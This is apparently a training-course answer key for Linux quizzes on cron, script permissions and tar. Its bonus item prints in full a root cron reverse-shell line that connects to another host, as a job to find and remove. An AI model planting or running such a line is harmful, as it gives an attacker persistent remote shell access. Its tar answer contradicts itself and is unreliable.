## Solution File: Reviewing Crons

1. Answer the following `cron` assessment questions:

    - When will the following `cron` schedules run?

      `*/10 * * * *` 

       - **Solution**: At every 10th minute.

    - What event is the following `cron` a minute away from?

      `59 23 31 12 *`

       - **Solution**: New Years!

    - What do the following hypothetical `cron` likely do?

        - `0 18 * * 1-5 /home/Bob/Sales/sum_of_sales.sh`

            - **Solution**: Run a script that adds up all the sales for the work day.

        - `@weekly /home/sysadmin/Scripts/auto-update.sh`

            - **Solution**: A weekly automated system update.

2. Answer the following `script` assessment questions:

    - What is a _shebang_?

        - **Solution**: It is the commented file declaration at the top of a shell script.

    - What two characters should come before the filename of a script?

        - **Solution**: `./`

    - Jane's script has _user_ and _group_ ownership of a script with `-rw-r--r--` permissions, but she cannot get it to run. What must she do to the file before it will run?

        - **Solution**: Run `chmod +x` on her file!

3. Answer the following `tar` assessment questions:

    - How does the `-x` option modify the `tar` command?

        - **Solution**: This option will let `tar` extract an archive!

    - If a directory has `ten` files and the following command is used in it, how many files are being archived?

        -   `tar cvvWf backups/archive.tar .`

            - **Solution**: Zero, because tar doesn’t compress!! But all files should be archived as they're all in the current directory!

    - What option prints the full file specification of files as you interact with them?

        - **Solution**: `-vv`

    - Why is the `-f` option used in almost every `tar` operation?

        - **Solution**: The `-f` option lets you designate a `tar` file to either _create_ or _extract_ or _list_ from.

4. **Bonus**: You are tasked to look through the `cron` jobs within your current workstation to see if any suspicious or modified cron jobs exist. Remove the one that matches the following descriptions: `Cron` is running system-level jobs with `root` privileges.The `cron` task you're looking for involves another machine.

   - Run: `sudo crontab -e` to open the `root` `crontab`.

   - The cron you wanted to remove was:

   - `*/2 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.188.164/888 0>&1`

---
© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.  
